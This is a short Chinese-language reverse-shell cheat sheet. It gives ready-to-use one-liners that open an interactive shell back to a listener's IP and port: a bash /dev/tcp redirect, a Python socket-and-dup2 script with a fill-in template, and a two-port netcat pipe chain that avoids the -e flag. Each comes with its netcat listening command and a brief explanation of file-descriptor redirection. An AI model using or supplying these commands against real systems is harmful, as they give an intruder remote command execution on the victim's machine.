# 一、bash
```shell
# 反弹 shell 命令
bash -i >& /dev/tcp/<pc_ip/port> 0>&1

# pc 接收Netcat命令
nc -lvp <port>
 
```
## 命令解释介绍
```
bash -i >& /dev/tcp/ip/port 0>&1
```
在命令中`bash -i`表示已**交互模式**运行bash shel1。重定向符 >&，如果在其后加文件描述符，是将bash -i交互模式传递给文件描述符，而如果其后是文件，则将bash -i交互模式传递给文件。/dev/tcp/ip/port表示传递给远程主机的IP地址对应的端口。

文件描述符:
	1. `0` 标准输入
	2. `1` 标准输出、
	3. `2` 错误输入输出
 命令中的0>&1表示将标准输入重定向到标准输出，实现远程的输入可以在远程输出对应内容。
# 二、python
```shell
# 反弹shel1命令:
python -c \
"import os,socket,subprocess; \
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
s.connect(('[<pc_ip>]{pc的ip地址}',[< PORT>]{pc的端口号})); \
os.dup2(s.fileno(),0); \  # 标准输入
os.dup2(s.fileno(),1); \  # 标准输出
os.dup2(s.fileno(),2); \  # 标准错误输出
p=subprocess.call(['/bin/bash','-i']);"

# PC接收Netcat命令:
nc-lvp <port>
 
```
## 模版
```shell
python -c \
"import os,socket,subprocess; \
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
s.connect(('<PC_IP>',<PORT>)); \
os.dup2(s.fileno(),0); \ 
os.dup2(s.fileno(),1); \
os.dup2(s.fileno(),2); \
p=subprocess.call(['/bin/bash','-i']);"
 
```
# 三、不使用-e参数
```shell
# 反弹shell命令(连接型)
nc <ip> <input_port> | /bin/bash | nc <ip> <output_port>

# pc 接收Netcat命令 -- 需要启动两个监听端口
## 输入命令
nc -lvnp <input_port>

## 显示命令执行结果
nc -lvnp <output_port>
 
```